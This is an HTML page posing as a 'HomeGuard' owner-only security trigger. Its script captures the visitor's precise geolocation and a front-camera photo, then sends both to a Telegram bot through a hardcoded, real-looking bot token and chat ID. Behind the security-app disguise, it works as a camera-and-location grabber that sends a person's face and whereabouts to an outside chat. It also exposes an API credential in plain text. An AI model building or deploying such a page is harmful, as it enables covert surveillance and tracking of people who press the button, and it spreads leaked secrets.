<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>HomeGuard Trigger</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      background: #0d0d0d;
      color: #e0e0e0;
      font-family: 'Courier New', monospace;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 24px;
    }

    .card {
      background: #1a1a1a;
      border: 1px solid #2a2a2a;
      border-radius: 12px;
      padding: 32px 28px;
      width: 100%;
      max-width: 380px;
      text-align: center;
    }

    .logo {
      font-size: 36px;
      margin-bottom: 12px;
    }

    h1 {
      font-size: 18px;
      font-weight: 600;
      color: #ffffff;
      letter-spacing: 2px;
      text-transform: uppercase;
      margin-bottom: 6px;
    }

    .subtitle {
      font-size: 11px;
      color: #555;
      letter-spacing: 1px;
      margin-bottom: 28px;
    }

    .status-box {
      background: #111;
      border: 1px solid #222;
      border-radius: 8px;
      padding: 16px;
      margin-bottom: 20px;
      min-height: 80px;
      display: flex;
      flex-direction: column;
      gap: 8px;
      align-items: flex-start;
    }

    .log-line {
      font-size: 12px;
      color: #666;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .log-line.active { color: #4ade80; }
    .log-line.error  { color: #f87171; }
    .log-line.done   { color: #60a5fa; }

    .dot {
      width: 6px;
      height: 6px;
      border-radius: 50%;
      background: currentColor;
      flex-shrink: 0;
    }

    .dot.pulse {
      animation: pulse 1s infinite;
    }

    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.2; }
    }

    button {
      width: 100%;
      padding: 14px;
      background: #16a34a;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-family: 'Courier New', monospace;
      font-size: 14px;
      font-weight: 700;
      letter-spacing: 1.5px;
      text-transform: uppercase;
      cursor: pointer;
      transition: background 0.2s;
    }

    button:hover { background: #15803d; }
    button:disabled {
      background: #1f2f1f;
      color: #3a5a3a;
      cursor: not-allowed;
    }

    video {
      display: none;
    }

    canvas {
      display: none;
    }

    .footer {
      margin-top: 20px;
      font-size: 10px;
      color: #333;
      letter-spacing: 1px;
    }
  </style>
</head>
<body>

  <div class="card">
    <div class="logo">🛡️</div>
    <h1>HomeGuard</h1>
    <div class="subtitle">REMOTE TRIGGER / OWNER ONLY</div>

    <div class="status-box" id="statusBox">
      <div class="log-line" id="logWaiting">
        <span class="dot"></span>
        <span>Waiting for trigger...</span>
      </div>
    </div>

    <button id="triggerBtn" onclick="runTrigger()">⚡ CAPTURE + SEND</button>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
  </div>

  <div class="footer">service.hima.com · HomeGuard v1</div>

<script>
  // ─── CONFIG ── Replace these with your actual values ──────────────────────
  const BOT_TOKEN = "8973797235:AAHeo3DYJHq79df4YXKleQu-sAanDgG1dcU";   // e.g. "123456789:ABCdef..."
  const CHAT_ID   = "8145264158";     // e.g. "987654321"
  // ──────────────────────────────────────────────────────────────────────────

  const TELEGRAM  = `https://api.telegram.org/bot${BOT_TOKEN}`;

  function log(msg, type = "active") {
    const box = document.getElementById("statusBox");
    // Remove waiting line on first real log
    const waiting = document.getElementById("logWaiting");
    if (waiting) waiting.remove();

    const line = document.createElement("div");
    line.className = `log-line ${type}`;
    line.innerHTML = `<span class="dot ${type === 'active' ? 'pulse' : ''}"></span><span>${msg}</span>`;
    box.appendChild(line);
  }

  async function runTrigger() {
    const btn = document.getElementById("triggerBtn");
    btn.disabled = true;
    document.getElementById("statusBox").innerHTML = "";

    log("Initializing...");

    // ── 1. Location ──────────────────────────────────────────────────────────
    let locText = null;
    let lat = null, lon = null;

    log("Requesting location...");
    try {
      const pos = await new Promise((res, rej) =>
        navigator.geolocation.getCurrentPosition(res, rej, {
          enableHighAccuracy: true, timeout: 10000
        })
      );
      lat = pos.coords.latitude;
      lon = pos.coords.longitude;
      locText = `📍 ${lat.toFixed(6)}, ${lon.toFixed(6)}\nAccuracy: ${Math.round(pos.coords.accuracy)}m`;
      log("Location captured ✓", "done");
    } catch (e) {
      log(`Location failed: ${e.message}`, "error");
    }

    // ── 2. Camera ────────────────────────────────────────────────────────────
    log("Requesting camera...");
    let photoBlob = null;

    try {
      // Try back camera first (phone held by intruder shows room better)
      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { exact: "user" } }
        });
      } catch {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
      }

      const video  = document.getElementById("video");
      const canvas = document.getElementById("canvas");

      video.srcObject = stream;
      await new Promise(res => video.onloadedmetadata = res);
      await new Promise(res => setTimeout(res, 1200)); // let camera warm up

      canvas.width  = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);

      // Stop stream
      stream.getTracks().forEach(t => t.stop());

      photoBlob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.85));
      log("Photo captured ✓", "done");
    } catch (e) {
      log(`Camera failed: ${e.message}`, "error");
    }

    // ── 3. Send to Telegram ──────────────────────────────────────────────────
    log("Sending to Telegram...");

    let allOk = true;

    // Send photo
    if (photoBlob) {
      try {
        const fd = new FormData();
        fd.append("chat_id", CHAT_ID);
        fd.append("photo", photoBlob, "hg_trigger.jpg");
        fd.append("caption", `🛡️ HomeGuard Trigger\n${locText || "Location unavailable"}`);

        const r = await fetch(`${TELEGRAM}/sendPhoto`, { method: "POST", body: fd });
        const j = await r.json();
        if (j.ok) log("Photo sent ✓", "done");
        else { log(`Photo send failed: ${j.description}`, "error"); allOk = false; }
      } catch (e) {
        log(`Send error: ${e.message}`, "error"); allOk = false;
      }
    }

    // Send location pin (separately, for Maps link)
    if (lat !== null) {
      try {
        const r = await fetch(`${TELEGRAM}/sendLocation`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
        });
        const j = await r.json();
        if (j.ok) log("Location pin sent ✓", "done");
        else log(`Location pin failed: ${j.description}`, "error");
      } catch (e) {
        log(`Location pin error: ${e.message}`, "error");
      }
    }

    // Done
    if (allOk) {
      log("All done ✓", "done");
    } else {
      log("Completed with some errors", "error");
    }

    // Re-enable after 5s
    setTimeout(() => { btn.disabled = false; }, 5000);
  }
</script>

</body>
</html>
